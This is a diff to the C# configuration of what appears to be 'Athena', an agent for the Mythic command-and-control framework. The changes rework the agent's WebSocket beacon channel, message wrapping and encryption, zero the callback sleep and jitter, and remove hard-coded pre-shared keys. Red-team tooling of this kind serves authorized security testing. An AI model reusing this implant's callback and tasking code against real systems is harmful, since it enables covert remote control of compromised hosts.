@@ -34,11 +34,11 @@ namespace Athena.Config
             //this.httpConfig = new HTTPS(this.uuid);
             //this.smbConfig = new SMB();
             //this.websocketConfig = new Websocket();          
-            this.uuid = "a6b34cb2-7694-4f6d-b202-bf7d78445f0b";
+            this.uuid = "1f69a913-b08c-4227-b8ea-44028ef0ceb0";
             this.killDate = DateTime.Parse("2022-08-22");
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 10;
+            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 0;
             this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 0;
             this.jitter = jitter;
             this.httpConfig = new HTTPS(this.uuid);
             this.smbConfig = new SMB();
@@ -89,7 +89,7 @@ namespace Athena.Config
             this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
-            this.psk = "EJWwOWUKwZ3ESBjh3TyzdeCTbqFKLssGDZbX+7BTLNc=";
+            this.psk = "";
             
             //Doesn't do anything yet
             this.encryptedExchangeCheck = bool.Parse("True");
@@ -135,6 +135,7 @@ namespace Athena.Config
             }
         }
     }
+
     public class Websocket
     {
         public string psk { get; set; }
@@ -151,7 +152,6 @@ namespace Athena.Config
 
         public Websocket(string uuid)
         {
-            Console.WriteLine("Creating.");
             //int callbackPort = Int32.Parse("callback_port");
             //string callbackHost = "callback_host";
             //string callbackURL = $"{callbackHost}:{callbackPort}";
@@ -171,7 +171,7 @@ namespace Athena.Config
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
-            this.psk = "Y5u8XXPCpooetMVuPFUIjmK3ASseLAIvNeJVbW9pOTY=";
+            this.psk = "";
             //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             if (!string.IsNullOrEmpty(this.psk))
             {
@@ -181,14 +181,14 @@ namespace Athena.Config
             this.ws = new ClientWebSocket();
             Connect(callbackURL);
         }
-
+        
         public bool Connect(string url)
         {
             try
             {
                 ws = new ClientWebSocket();
                 ws.ConnectAsync(new Uri(url), CancellationToken.None);
-                while(ws.State == WebSocketState.Connecting)
+                while(ws.State != WebSocketState.Open)
                 {
                 }
 
@@ -205,25 +205,42 @@ namespace Athena.Config
             try
             {
                 string json = JsonConvert.SerializeObject(obj);
-                Console.WriteLine(json);
-                //json = this.crypt.Encrypt(json);
-                byte[] msg = System.Text.Encoding.ASCII.GetBytes(json);
-
+                if (Globals.encrypted)
+                {
+                    json = this.crypt.Encrypt(json);
+                }
+                else
+                {
+                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                }
+                WebSocketMessage m = new WebSocketMessage()
+                {
+                    Client = true,
+                    Data = json,
+                    Tag = ""
+                };
+                string message = JsonConvert.SerializeObject(m);
+                byte[] msg = Encoding.UTF8.GetBytes(message);           
                 await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
-                Console.WriteLine("Sent.");
-                //await Send(ws, json);
-                string result = await Receive(ws);
-                //return this.crypt.Decrypt(result);
-                return result;
+                message = await Receive(ws);
+                m = JsonConvert.DeserializeObject<WebSocketMessage>(message);
+
+                if (Globals.encrypted)
+                {
+                    return this.crypt.Decrypt(m.Data);
+                }
+                else
+                {
+                    return Misc.Base64Decode(m.Data).Substring(36);
+                }
             }
-            catch (Exception e)
+            catch
             {
                 return "";
             }
         }
         static async Task<string> Receive(ClientWebSocket socket)
         {
-            Console.WriteLine("Getting response");
             var buffer = new ArraySegment<byte>(new byte[2048]);
             do
             {
@@ -246,9 +263,11 @@ namespace Athena.Config
             } while (true);
             return "";
         }
-        static async Task Send(ClientWebSocket socket, string data)
+        private class WebSocketMessage
         {
-            await socket.SendAsync(Encoding.UTF8.GetBytes(data), WebSocketMessageType.Text, true, CancellationToken.None);
+            public bool Client { get; set; }
+            public string Data { get; set; }
+            public string Tag { get; set; }
         }
     }
     public class SMB
